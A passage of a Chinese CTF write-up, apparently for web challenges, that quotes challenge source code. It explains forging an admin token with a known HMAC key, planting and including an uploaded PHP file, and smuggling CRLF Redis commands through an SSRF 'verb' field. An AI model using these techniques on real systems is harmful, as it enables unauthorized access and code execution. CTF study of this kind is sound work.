<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validateCredentials</span>(<span class="params">Authenticatable <span class="variable">$user</span>, <span class="keyword">array</span> <span class="variable">$credentials</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$tokenJson</span>, <span class="variable">$signature</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$credentials</span>[<span class="string">&quot;c_secure_pass&quot;</span>]));</span><br><span class="line">    <span class="variable">$expectedSignature</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$tokenJson</span>, <span class="variable">$user</span>-&gt;auth_key);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">hash_equals</span>(<span class="variable">$expectedSignature</span>, <span class="variable">$signature</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此获取到admin的auth_key之后可以进行伪造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;user_id&quot;</span> =&gt; <span class="string">&quot;1&quot;</span>,<span class="string">&quot;expires&quot;</span> =&gt; <span class="number">1992307586</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$data</span>, <span class="string">&quot;73ec97f74152abca89d44ec21be2e46b54b86947&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span> . <span class="string">&quot;.&quot;</span> . <span class="variable">$s</span>);</span><br></pre></td></tr></table></figure>

<p>尝试登录成功，管理员的站点设置中可以允许上传php，但是题目中貌似把public下的写权限全部去除了<br><img src="/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/3.png" alt="alt text"></p>
<p>因此找到另一处文件包含点public&#x2F;page.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;../include/bittorrent.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;view&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$view</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;view&#x27;</span>], <span class="string">&quot;/.&quot;</span>);</span><br><span class="line">    <span class="variable">$view</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="variable">$view</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;plugin&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$pluginId</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;plugin&#x27;</span>];</span><br><span class="line">        <span class="variable">$plugin</span> = <span class="title class_">\Nexus\Plugin\Plugin</span>::<span class="title function_ invoke__">getById</span>(<span class="variable">$pluginId</span>);</span><br><span class="line">        <span class="variable">$viewFile</span> = <span class="variable">$plugin</span>-&gt;<span class="title function_ invoke__">getNexusView</span>(<span class="variable">$view</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$viewFile</span> = ROOT_PATH . <span class="string">&quot;resources/views/<span class="subst">$view</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">str_ends_with</span>(<span class="variable">$viewFile</span>, <span class="string">&quot;.php&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$viewFile</span> .= <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$viewFile</span>)) &#123;</span><br><span class="line">        <span class="keyword">require</span> <span class="variable">$viewFile</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;viewFile: <span class="subst">$viewFile</span> not exists, _REQUEST: &quot;</span> . <span class="title function_ invoke__">json_encode</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">        <span class="title function_ invoke__">do_log</span>(<span class="variable">$msg</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\RuntimeException</span>(<span class="variable">$msg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;require view parameter, _REQUEST: &quot;</span> . <span class="title function_ invoke__">json_encode</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    <span class="title function_ invoke__">do_log</span>(<span class="variable">$msg</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\RuntimeException</span>(<span class="variable">$msg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接把附件目录改到该目录下<br><img src="/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/4.png" alt="alt text"></p>
<p>然后到任意一处编辑框进行文件上传<br><img src="/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/5.png" alt="alt text"></p>
<p>通过文件包含点爆破即可，文件名格式: [日期（精确到秒）][文件md5].php<br><img src="/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/6.png" alt="alt text"></p>
<h2 id="日志系统"><a href="#日志系统" class="headerlink" title="日志系统"></a>日志系统</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/oHrFdG0vvHKNlWguUWVXAA">https://mp.weixin.qq.com/s/oHrFdG0vvHKNlWguUWVXAA</a></p>
<h2 id="anime"><a href="#anime" class="headerlink" title="anime"></a>anime</h2><p><a target="_blank" rel="noopener" href="https://psdat123.github.io/posts/HCMUS-CTF-2025/">https://psdat123.github.io/posts/HCMUS-CTF-2025/</a></p>
<h2 id="CeleRace"><a href="#CeleRace" class="headerlink" title="CeleRace"></a>CeleRace</h2><p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> framework <span class="keyword">import</span> MiniFlask, jsonify, request, session, save_session</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> auth</span><br><span class="line"><span class="keyword">from</span> .tasks <span class="keyword">import</span> celery_app</span><br><span class="line"></span><br><span class="line">STATIC_DIR = (Path(__file__).resolve().parent.parent / <span class="string">&quot;static&quot;</span>).resolve()</span><br><span class="line"></span><br><span class="line">app = MiniFlask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">require_login</span>(<span class="params">next_handler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">**kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;user&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;login required&quot;</span>&#125;, status=<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> next_handler(**kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">require_admin</span>(<span class="params">next_handler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">**kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;role&quot;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;admin only&quot;</span>&#125;, status=<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> next_handler(**kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_user</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    username = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        request.user = username</span><br><span class="line">        request.role = session.get(<span class="string">&quot;role&quot;</span>, <span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.user = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        request.role = <span class="string">&quot;guest&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ensure_cookie</span>(<span class="params">response</span>):</span><br><span class="line">    response.headers.setdefault(<span class="string">&quot;X-App&quot;</span>, <span class="string">&quot;MiniWSGI&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_static_response</span>(<span class="params">path: Path</span>):</span><br><span class="line">    <span class="keyword">from</span> werkzeug.exceptions <span class="keyword">import</span> NotFound</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path.exists() <span class="keyword">or</span> <span class="keyword">not</span> path.is_file():</span><br><span class="line">        <span class="keyword">raise</span> NotFound()</span><br><span class="line">    mimetype, _ = mimetypes.guess_type(<span class="built_in">str</span>(path))</span><br><span class="line">    <span class="keyword">with</span> path.<span class="built_in">open</span>(<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">        data = fh.read()</span><br><span class="line">    <span class="keyword">return</span> app.response_class(data, mimetype=mimetype <span class="keyword">or</span> <span class="string">&quot;application/octet-stream&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">frontend</span>():</span><br><span class="line">    <span class="keyword">return</span> _static_response(STATIC_DIR / <span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/static/app.js&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">static_app_js</span>():</span><br><span class="line">    <span class="keyword">return</span> _static_response(STATIC_DIR / <span class="string">&quot;app.js&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/static/style.css&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">static_style_css</span>():</span><br><span class="line">    <span class="keyword">return</span> _static_response(STATIC_DIR / <span class="string">&quot;style.css&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/api/info&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_info</span>():</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;MiniWSGI Task Board&quot;</span>, <span class="string">&quot;user&quot;</span>: request.user&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/register&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    data = request.get_json(silent=<span class="literal">True</span>) <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        auth.register(data.get(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;&quot;</span>), data.get(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        save_session()</span><br><span class="line">    <span class="keyword">except</span> auth.AuthError <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(exc)&#125;), <span class="number">400</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;registered&quot;</span>, <span class="string">&quot;user&quot;</span>: auth.current_user()&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    data = request.get_json(silent=<span class="literal">True</span>) <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        auth.authenticate(data.get(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;&quot;</span>), data.get(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        save_session()</span><br><span class="line">    <span class="keyword">except</span> auth.AuthError <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(exc)&#125;), <span class="number">401</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;logged in&quot;</span>, <span class="string">&quot;user&quot;</span>: auth.current_user()&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    auth.logout()</span><br><span class="line">    save_session()</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;logged out&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/session&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">session_info</span>():</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;user&quot;</span>: session.get(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;guest&quot;</span>), <span class="string">&quot;role&quot;</span>: session.get(<span class="string">&quot;role&quot;</span>, <span class="string">&quot;guest&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_queue</span>(<span class="params">task_name: <span class="built_in">str</span>, **kwargs</span>):</span><br><span class="line">    result = celery_app.send_task(task_name, kwargs=kwargs)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;task_id&quot;</span>: result.<span class="built_in">id</span>, <span class="string">&quot;task&quot;</span>: task_name&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/tasks/echo&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">queue_echo</span>():</span><br><span class="line">    data = request.get_json(silent=<span class="literal">True</span>) <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    message = data.get(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> _queue(<span class="string">&quot;miniws.echo&quot;</span>, message=message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/tasks/fetch&quot;</span>, middlewares=[require_admin]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">queue_fetch_root</span>():</span><br><span class="line">    <span class="keyword">return</span> queue_fetch(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/tasks/fetch/&lt;path:target&gt;&quot;</span>, middlewares=[require_admin]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">queue_fetch</span>(<span class="params">target: <span class="built_in">str</span></span>):</span><br><span class="line">    payload = request.get_json(silent=<span class="literal">True</span>) <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    url = payload.get(<span class="string">&quot;url&quot;</span>) <span class="keyword">or</span> target</span><br><span class="line">    verb = payload.get(<span class="string">&quot;verb&quot;</span>, <span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;url required&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">    host_header = payload.get(<span class="string">&quot;host&quot;</span>)</span><br><span class="line">    body = payload.get(<span class="string">&quot;body&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> _queue(<span class="string">&quot;miniws.fetch&quot;</span>, url=url, host_header=host_header, body=body, verb=verb)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/tasks/result&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task_result</span>():</span><br><span class="line">    task_id = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> task_id:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;task id required&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">    result = celery_app.AsyncResult(task_id)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result.ready():</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;state&quot;</span>: result.state&#125;)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;state&quot;</span>: result.state, <span class="string">&quot;result&quot;</span>: result.result&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>漏洞点在于以下这个路由可以SSRF，但是有一个鉴权中间件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/tasks/fetch/&lt;path:target&gt;&quot;</span>, middlewares=[require_admin]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">queue_fetch</span>(<span class="params">target: <span class="built_in">str</span></span>):</span><br><span class="line">    payload = request.get_json(silent=<span class="literal">True</span>) <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    url = payload.get(<span class="string">&quot;url&quot;</span>) <span class="keyword">or</span> target</span><br><span class="line">    verb = payload.get(<span class="string">&quot;verb&quot;</span>, <span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;url required&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">    host_header = payload.get(<span class="string">&quot;host&quot;</span>)</span><br><span class="line">    body = payload.get(<span class="string">&quot;body&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> _queue(<span class="string">&quot;miniws.fetch&quot;</span>, url=url, host_header=host_header, body=body, verb=verb)</span><br></pre></td></tr></table></figure>

<p>auth.py里面可以看到正常注册的用户都是user身份，所以要想办法绕过这个中间件鉴权。</p>
<p>整个flask应用实际来源于一个MiniFlask类，在framework&#x2F;app.py中定义</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app = MiniFlask(__name__)</span><br></pre></td></tr></table></figure>

<p>绕过 require_admin 中间件后，就可以直接请求 queue_fetch 接口。<br>tasks.py里可以看到miniws.fetch这个任务实际上就是自定义了一个请求包然后发送</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@celery_app.task(<span class="params">name=<span class="string">&quot;miniws.fetch&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_task</span>(<span class="params">url: <span class="built_in">str</span>, *, host_header: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>, body: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>, verb: <span class="built_in">str</span> = <span class="string">&quot;GET&quot;</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    parsed = urlparse(url)</span><br><span class="line">    host = parsed.hostname <span class="keyword">or</span> settings.redis_host</span><br><span class="line">    port = parsed.port <span class="keyword">or</span> (<span class="number">443</span> <span class="keyword">if</span> parsed.scheme == <span class="string">&quot;https&quot;</span> <span class="keyword">else</span> <span class="number">80</span>)</span><br><span class="line">    path = parsed.path <span class="keyword">or</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="keyword">if</span> parsed.query:</span><br><span class="line">        path = <span class="string">f&quot;<span class="subst">&#123;path&#125;</span>?<span class="subst">&#123;parsed.query&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    request_host = host_header <span class="keyword">or</span> parsed.netloc <span class="keyword">or</span> <span class="string">f&quot;<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">    request_body = body.encode() <span class="keyword">if</span> body <span class="keyword">else</span> <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = (</span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;verb&#125;</span> <span class="subst">&#123;path&#125;</span> HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Host: <span class="subst">&#123;request_host&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;User-Agent: MiniFetch/1.0\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Connection: close\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    ).encode() + request_body</span><br><span class="line"></span><br><span class="line">    chunks: <span class="built_in">list</span>[<span class="built_in">bytes</span>] = []</span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((host, port), timeout=<span class="number">5</span>) <span class="keyword">as</span> sock:</span><br><span class="line">        sock.sendall(payload)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = sock.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            chunks.append(data)</span><br><span class="line">    preview = <span class="string">b&quot;&quot;</span>.join(chunks)[:<span class="number">2048</span>]</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;preview&quot;</span>: preview.decode(errors=<span class="string">&quot;replace&quot;</span>), <span class="string">&quot;bytes&quot;</span>: <span class="built_in">len</span>(preview)&#125;</span><br></pre></td></tr></table></figure>

<p>fetch_task 直接将用户输入拼接进了请求体中，只需将 url 设置为 <code>http://127.0.0.1:6379</code>，通过控制 verb 即可与本机 Redis 服务交互，例如设置 verb 为 <code>info\r\nquit\r\n</code>。由于 Redis 存在未授权访问，可读取或修改 Redis 内数据，理论上可以随意创建 Celery 消息，也可以伪造任务的执行结果。<br>redis.acl</p>
